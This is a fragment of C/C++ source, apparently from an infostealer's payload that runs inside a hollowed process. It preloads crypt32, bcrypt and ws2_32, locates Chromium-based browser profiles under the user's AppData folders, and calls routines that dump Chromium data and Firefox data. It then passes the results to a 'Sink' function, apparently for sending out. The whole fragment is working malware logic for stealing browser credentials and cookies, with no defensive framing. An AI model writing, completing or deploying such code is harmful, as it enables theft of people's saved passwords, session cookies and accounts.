    g_first_rec = true;
    Dbg("payload_entry: loading sqlite");
    if(!Sqlite()){ Dbg("payload_entry: Sqlite FAILED"); return 1; }
    Dbg("payload_entry: Sqlite OK");
    // The hollowed process doesn't have crypt32.dll/bcrypt.dll/ws2_32.dll loaded by default.
    // Preload them so IAT addresses resolve (same-session ASLR uses same base in all processes).
    LoadLibraryA("crypt32.dll");
    LoadLibraryA("bcrypt.dll");
    LoadLibraryA("ws2_32.dll");
    wchar_t la[1024], aa[1024];
    if(!GetEnvironmentVariableW(L"LOCALAPPDATA",la,1024)){ Dbg("payload_entry: no LOCALAPPDATA"); return 2; }
    if(!GetEnvironmentVariableW(L"APPDATA",aa,1024)){ Dbg("payload_entry: no APPDATA"); return 2; }
    Dbg("payload_entry: env OK, dumping");
    PutS("[");
    Dbg("payload_entry: after PutS([, entering chromium loop");
    for(unsigned i=0;i<sizeof(g_br)/sizeof(g_br[0]);i++){
        wchar_t root[1024]; lstrcpyW(root,la); lstrcatW(root,g_br[i].rel);
        wchar_t alt[1024];  lstrcpyW(alt,aa);  lstrcatW(alt,g_br[i].rel);
        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) lstrcpyW(root,alt);
        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) continue;
        Dbg("payload_entry: found chromium profile");
        LoadLocalState(root);
        DumpChromium(g_br[i].name,root);
    }
    Dbg("payload_entry: before DumpFirefox");
    DumpFirefox(aa);
    Dbg("payload_entry: after DumpFirefox");
    Dbg("payload_entry: extraction done, calling Sink");
    bool ok=Sink();
    Dbg(ok?"payload_entry: Sink OK":"payload_entry: Sink FAILED");
    return 0;
}
